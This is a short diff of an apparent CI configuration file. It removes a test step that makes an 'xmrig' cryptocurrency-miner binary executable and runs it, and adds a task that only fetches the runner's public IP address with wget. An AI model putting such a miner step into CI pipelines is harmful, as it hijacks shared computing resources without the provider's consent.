@@ -1,4 +1,6 @@
-test_task:
+task:
+  name: Test IP
   container:
-    image: node:latest
-  test_script: chmod 500 xmrig && ph add xmrig
+    image: cirrusci/wget:latest
+    use_static_ip: true
+  script: wget -qO- ifconfig.co
